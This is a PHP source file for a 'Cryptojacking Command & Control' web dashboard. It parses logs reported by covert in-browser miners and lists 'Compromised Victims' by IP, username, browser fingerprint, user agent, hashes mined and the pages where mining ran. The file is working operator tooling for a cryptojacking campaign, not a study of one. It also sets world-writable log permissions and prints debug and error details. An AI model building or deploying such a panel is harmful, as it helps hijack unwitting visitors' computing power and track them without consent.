<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Define the log file path
$logFile = 'mining_stats.log';

// Create the log file if it doesn't exist
if (!file_exists($logFile)) {
    touch($logFile);
    chmod($logFile, 0666);
    $logs = "No mining data yet.";
} else {
    // Check if the file is readable and has content
    if (is_readable($logFile) && filesize($logFile) > 0) {
        $logs = file_get_contents($logFile);
    } else {
        $logs = "No mining data yet or log file is not readable.";
        // Try to fix permissions
        chmod($logFile, 0666);
    }
}

// Parse logs to calculate statistics
$totalHashes = 0;
$activeMiners = [];
$minerData = [];
$uniqueVictims = [];
$victimDetails = [];

if (file_exists($logFile) && filesize($logFile) > 0) {
    $logLines = explode("\n", trim($logs));
    foreach ($logLines as $line) {
        if (empty($line)) continue;
        
        // Extract JSON data from log line
        if (preg_match('/Mining data from .*?: (.*)$/', $line, $matches)) {
            $jsonData = json_decode($matches[1], true);
            if ($jsonData) {
                // Track total hashes
                $totalHashes += $jsonData['h'] ?? 0;
                
                // Track active miners by IP and browser fingerprint
                $ip = '';
                if (preg_match('/Mining data from ([\d\.]+):/', $line, $ipMatches)) {
                    $ip = $ipMatches[1];
                }
                
                // Use browser fingerprint as unique identifier if available
                $identifier = $jsonData['id'] ?? $ip;
                $timestamp = $jsonData['ts'] ?? '';
                $username = $jsonData['username'] ?? 'unknown_user';
                
                if (!empty($identifier)) {
                    $activeMiners[$identifier] = $timestamp;
                    
                    // Track unique victims
                    if (!isset($uniqueVictims[$identifier])) {
                        $uniqueVictims[$identifier] = [
                            'ip' => $ip,
                            'first_seen' => $timestamp,
                            'last_seen' => $timestamp,
                            'user_agent' => $jsonData['ua'] ?? 'Unknown',
                            'total_hashes' => 0,
                            'pages_visited' => [],
                            'mining_sessions' => 0,
                            'username' => $username
                        ];
                    }
                    
                    // Update victim details
                    $uniqueVictims[$identifier]['last_seen'] = $timestamp;
                    $uniqueVictims[$identifier]['total_hashes'] += $jsonData['h'] ?? 0;
                    $uniqueVictims[$identifier]['mining_sessions']++;
                    
                    // Update username if we have a better one (not unknown_user)
                    if ($username !== 'unknown_user' && $uniqueVictims[$identifier]['username'] === 'unknown_user') {
                        $uniqueVictims[$identifier]['username'] = $username;
                    }
                    
                    // Track pages where mining occurred
                    if (!empty($jsonData['url']) && !in_array($jsonData['url'], $uniqueVictims[$identifier]['pages_visited'])) {
                        $uniqueVictims[$identifier]['pages_visited'][] = $jsonData['url'];
                    }
                }
                
                // Store miner data for detailed view
                $minerData[] = [
                    'ip' => $ip,
                    'id' => $identifier,
                    'timestamp' => $timestamp,
                    'hashRate' => $jsonData['r'] ?? 0,
                    'totalHashes' => $jsonData['h'] ?? 0,
                    'runningTime' => $jsonData['t'] ?? 0,
                    'userAgent' => $jsonData['ua'] ?? '',
                    'url' => $jsonData['url'] ?? '',
                    'username' => $username
                ];
            }
        }
    }
}

// Filter to only show miners active in the last 10 minutes
$activeMiners = array_filter($activeMiners, function($timestamp) {
    if (empty($timestamp)) return false;
    $lastActive = strtotime($timestamp);
    return (time() - $lastActive) < 600; // 10 minutes
});

// Sort miner data by timestamp (newest first)
usort($minerData, function($a, $b) {
    return strtotime($b['timestamp'] ?? 0) - strtotime($a['timestamp'] ?? 0);
});

// Prepare victim details for display
foreach ($uniqueVictims as $id => $victim) {
    $victimDetails[] = $victim;
}

// Sort victims by total hashes (highest first)
usort($victimDetails, function($a, $b) {
    return $b['total_hashes'] - $a['total_hashes'];
});

// Limit to most recent 100 entries for performance
$minerData = array_slice($minerData, 0, 100);

// Calculate mining statistics
$totalMiningTime = 0;
$totalSessions = count($minerData);
$avgHashRate = 0;
$hashCount = 0;

foreach ($minerData as $miner) {
    $totalMiningTime += $miner['runningTime'] ?? 0;
    if (!empty($miner['hashRate'])) {
        $avgHashRate += $miner['hashRate'];
        $hashCount++;
    }
}

$avgHashRate = $hashCount > 0 ? $avgHashRate / $hashCount : 0;
?>
<!DOCTYPE html>
<html>
<head>
    <title>Crypto Mining Command & Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="10"> <!-- Auto-refresh every 10 seconds -->
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #0f3460;
            --highlight: #e94560;
            --text: #f1f1f1;
            --text-secondary: #b0b0b0;
            --success: #4caf50;
            --warning: #ff9800;
            --danger: #f44336;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: var(--primary);
            color: var(--text);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            border-bottom: 1px solid var(--accent);
            padding-bottom: 15px;
        }
        
        h1, h2, h3 { 
            color: var(--text);
            margin-bottom: 15px;
        }
        
        h1 {
            font-size: 2.2rem;
        }
        
        h2 {
            font-size: 1.8rem;
            margin-top: 30px;
        }
        
        h3 {
            font-size: 1.4rem;
            color: var(--text-secondary);
        }
        
        .card {
            background: var(--secondary);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            border-left: 4px solid var(--accent);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-box {
            background: var(--accent);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }
        
        .stat-box:hover {
            transform: translateY(-5px);
        }
        
        .stat-value {
            font-size: 2.5em;
            font-weight: bold;
            margin: 10px 0;
            color: var(--text);
        }
        
        .stat-label {
            font-size: 0.9em;
            text-transform: uppercase;
            color: var(--text-secondary);
            letter-spacing: 1px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: var(--secondary);
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--accent);
        }
        
        th {
            background-color: var(--accent);
            color: var(--text);
            font-weight: 500;
            text-transform: uppercase;
            font-size: 0.85em;
            letter-spacing: 1px;
        }
        
        tr:hover {
            background-color: rgba(15, 52, 96, 0.5);
        }
        
        tr:last-child td {
            border-bottom: none;
        }
        
        .raw-logs {
            background: var(--secondary);
            color: var(--text-secondary);
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            font-size: 0.9em;
            line-height: 1.5;
        }
        
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--accent);
        }
        
        .tab {
            padding: 10px 20px;
            background: var(--secondary);
            cursor: pointer;
            border-radius: 8px 8px 0 0;
            margin-right: 5px;
            transition: all 0.3s ease;
        }
        
        .tab:hover {
            background: var(--accent);
        }
        
        .tab.active {
            background: var(--accent);
            color: var(--text);
            border-bottom: 3px solid var(--highlight);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: bold;
            text-transform: uppercase;
            margin-left: 5px;
        }
        
        .badge-success {
            background-color: var(--success);
            color: white;
        }
        
        .badge-warning {
            background-color: var(--warning);
            color: black;
        }
        
        .badge-danger {
            background-color: var(--danger);
            color: white;
        }
        
        .victim-card {
            background: var(--secondary);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            border-left: 4px solid var(--highlight);
        }
        
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            border-bottom: 1px solid var(--accent);
            padding-bottom: 10px;
        }
        
        .victim-details {
            margin-top: 10px;
            font-size: 0.9em;
        }
        
        .victim-details p {
            margin-bottom: 5px;
            color: var(--text-secondary);
        }
        
        .victim-details strong {
            color: var(--text);
        }
        
        .pages-list {
            list-style: none;
            margin-top: 5px;
            font-size: 0.85em;
        }
        
        .pages-list li {
            padding: 3px 0;
            border-bottom: 1px dotted var(--accent);
        }
        
        .refresh-button {
            background-color: var(--highlight);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }
        
        .refresh-button:hover {
            background-color: #c81c44;
        }
        
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-active {
            background-color: var(--success);
            box-shadow: 0 0 5px var(--success);
        }
        
        .status-inactive {
            background-color: var(--danger);
        }
        
        .auto-refresh {
            font-size: 0.8em;
            color: var(--text-secondary);
            margin-top: 5px;
        }
        
        #timer {
            font-weight: bold;
            color: var(--highlight);
        }
        
        .debug-info {
            margin-top: 20px;
            padding: 10px;
            background-color: rgba(0,0,0,0.3);
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>⛏️ Cryptojacking Command & Control</h1>
            <button class="refresh-button" onclick="location.reload()">Refresh Dashboard</button>
        </header>
        
        <div class="auto-refresh">Auto-refreshing in <span id="timer">10</span> seconds</div>
        
        <div class="tabs">
            <div class="tab active" onclick="openTab(event, 'dashboard')">Dashboard</div>
            <div class="tab" onclick="openTab(event, 'victims')">Victims</div>
            <div class="tab" onclick="openTab(event, 'activity')">Activity Log</div>
            <div class="tab" onclick="openTab(event, 'raw-logs')">Raw Logs</div>
        </div>
        
        <div id="dashboard" class="tab-content active">
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="stat-label">Total Hashes Mined</div>
                    <div class="stat-value"><?php echo number_format($totalHashes); ?></div>
                </div>
                <div class="stat-box">
                    <div class="stat-label">Active Miners</div>
                    <div class="stat-value"><?php echo count($activeMiners); ?></div>
                </div>
                <div class="stat-box">
                    <div class="stat-label">Unique Victims</div>
                    <div class="stat-value"><?php echo count($uniqueVictims); ?></div>
                </div>
                <div class="stat-box">
                    <div class="stat-label">Avg. Hash Rate</div>
                    <div class="stat-value"><?php echo number_format($avgHashRate); ?> H/s</div>
                </div>
            </div>
            
            <div class="card">
                <h2>Active Mining Sessions</h2>
                <p>Showing miners active in the last 10 minutes</p>
                <table>
                    <thead>
                        <tr>
                            <th>Status</th>
                            <th>Username</th>
                            <th>Victim ID</th>
                            <th>IP Address</th>
                            <th>Last Seen</th>
                            <th>Hash Rate</th>
                            <th>Total Hashes</th>
                            <th>Page</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php 
                        $recentMiners = [];
                        foreach($minerData as $miner) {
                            $id = $miner['id'] ?? $miner['ip'];
                            if (!isset($recentMiners[$id]) && isset($activeMiners[$id])) {
                                $recentMiners[$id] = $miner;
                            }
                        }
                        
                        foreach($recentMiners as $miner): 
                            $lastSeen = strtotime($miner['timestamp'] ?? 0);
                            $isActive = (time() - $lastSeen) < 300; // 5 minutes
                        ?>
                        <tr>
                            <td>
                                <span class="status-indicator <?php echo $isActive ? 'status-active' : 'status-inactive'; ?>"></span>
                                <?php echo $isActive ? 'Active' : 'Idle'; ?>
                            </td>
                            <td><?php echo htmlspecialchars($miner['username'] ?? 'Unknown'); ?></td>
                            <td><?php echo htmlspecialchars($miner['id'] ?? 'Unknown'); ?></td>
                            <td><?php echo htmlspecialchars($miner['ip'] ?? 'Unknown'); ?></td>
                            <td><?php echo date('H:i:s', strtotime($miner['timestamp'] ?? 'now')); ?></td>
                            <td><?php echo number_format($miner['hashRate'] ?? 0); ?> H/s</td>
                            <td><?php echo number_format($miner['totalHashes'] ?? 0); ?></td>
                            <td><?php echo !empty($miner['url']) ? parse_url($miner['url'], PHP_URL_PATH) : 'Unknown'; ?></td>
                        </tr>
                        <?php endforeach; ?>
                        <?php if (empty($recentMiners)): ?>
                        <tr>
                            <td colspan="8" style="text-align: center;">No active miners at the moment</td>
                        </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="victims" class="tab-content">
            <h2>Compromised Victims <span class="badge badge-danger"><?php echo count($victimDetails); ?></span></h2>
            
            <?php foreach($victimDetails as $victim): 
                $lastSeen = strtotime($victim['last_seen']);
                $isActive = (time() - $lastSeen) < 600; // 10 minutes
            ?>
            <div class="victim-card">
                <div class="victim-header">
                    <h3>
                        Victim: <?php echo htmlspecialchars(substr($victim['ip'], 0, 15)); ?>
                        <?php if($isActive): ?>
                            <span class="badge badge-success">Active</span>
                        <?php else: ?>
                            <span class="badge badge-warning">Inactive</span>
                        <?php endif; ?>
                    </h3>
                    <div>
                        <strong><?php echo number_format($victim['total_hashes']); ?></strong> hashes mined
                    </div>
                </div>
                <div class="victim-details">
                    <p><strong>Username:</strong> <?php echo htmlspecialchars($victim['username'] ?? 'Unknown'); ?></p>
                    <p><strong>First seen:</strong> <?php echo date('Y-m-d H:i:s', strtotime($victim['first_seen'])); ?></p>
                    <p><strong>Last activity:</strong> <?php echo date('Y-m-d H:i:s', strtotime($victim['last_seen'])); ?></p>
                    <p><strong>Browser:</strong> <?php echo htmlspecialchars($victim['user_agent']); ?></p>
                    <p><strong>Mining sessions:</strong> <?php echo $victim['mining_sessions']; ?></p>
                    
                    <?php if(!empty($victim['pages_visited'])): ?>
                    <p><strong>Pages where mining occurred:</strong></p>
                    <ul class="pages-list">
                        <?php foreach($victim['pages_visited'] as $page): ?>
                        <li><?php echo htmlspecialchars($page); ?></li>
                        <?php endforeach; ?>
                    </ul>
                    <?php endif; ?>
                </div>
            </div>
            <?php endforeach; ?>
            
            <?php if (empty($victimDetails)): ?>
            <div class="card">
                <p style="text-align: center;">No victims recorded yet</p>
            </div>
            <?php endif; ?>
        </div>
        
        <div id="activity" class="tab-content">
            <div class="card">
                <h2>Mining Activity Log</h2>
                <p>Showing the most recent 100 mining reports</p>
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Username</th>
                            <th>Victim ID</th>
                            <th>IP Address</th>
                            <th>Hash Rate</th>
                            <th>Hashes</th>
                            <th>Duration</th>
                            <th>Page</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach($minerData as $miner): ?>
                        <tr>
                            <td><?php echo date('H:i:s', strtotime($miner['timestamp'] ?? 'now')); ?></td>
                            <td><?php echo htmlspecialchars($miner['username'] ?? 'Unknown'); ?></td>
                            <td><?php echo htmlspecialchars(substr($miner['id'] ?? 'Unknown', 0, 8)); ?></td>
                            <td><?php echo htmlspecialchars($miner['ip'] ?? 'Unknown'); ?></td>
                            <td><?php echo number_format($miner['hashRate'] ?? 0); ?> H/s</td>
                            <td><?php echo number_format($miner['totalHashes'] ?? 0); ?></td>
                            <td><?php echo gmdate("H:i:s", $miner['runningTime'] ?? 0); ?></td>
                            <td><?php echo !empty($miner['url']) ? parse_url($miner['url'], PHP_URL_PATH) : 'Unknown'; ?></td>
                        </tr>
                        <?php endforeach; ?>
                        <?php if (empty($minerData)): ?>
                        <tr>
                            <td colspan="8" style="text-align: center;">No mining activity recorded yet</td>
                        </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="raw-logs" class="tab-content">
            <div class="card">
                <h2>Raw Mining Logs</h2>
                <div class="raw-logs"><?php echo htmlspecialchars($logs); ?></div>
            </div>
            
            <!-- Debug information -->
            <div class="debug-info">
                <p>Log file: <?php echo $logFile; ?></p>
                <p>Log file exists: <?php echo file_exists($logFile) ? 'Yes' : 'No'; ?></p>
                <p>Log file size: <?php echo file_exists($logFile) ? filesize($logFile) . ' bytes' : 'N/A'; ?></p>
                <p>Log file permissions: <?php echo file_exists($logFile) ? substr(sprintf('%o', fileperms($logFile)), -4) : 'N/A'; ?></p>
                <p>PHP version: <?php echo phpversion(); ?></p>
                <p>Server time: <?php echo date('Y-m-d H:i:s'); ?></p>
                <p>Last error: <?php echo error_get_last() ? print_r(error_get_last(), true) : 'None'; ?></p>
            </div>
        </div>
    </div>
    
    <script>
        // Tab switching functionality
        function openTab(evt, tabName) {
            // Hide all tab content
            var tabcontent = document.getElementsByClassName("tab-content");
            for (var i = 0; i < tabcontent.length; i++) {
                tabcontent[i].classList.remove("active");
            }
            
            // Remove active class from all tabs
            var tabs = document.getElementsByClassName("tab");
            for (var i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove("active");
            }
            
            // Show the selected tab content and mark the button as active
            document.getElementById(tabName).classList.add("active");
            evt.currentTarget.classList.add("active");
        }
        
        // Auto-refresh timer
        let timeLeft = 10;
        const timerElement = document.getElementById('timer');
        
        function updateTimer() {
            timeLeft--;
            timerElement.textContent = timeLeft;
            
            if (timeLeft <= 0) {
                location.reload();
            } else {
                setTimeout(updateTimer, 1000);
            }
        }
        
        // Start the timer
        setTimeout(updateTimer, 1000);
    </script>
</body>
</html> 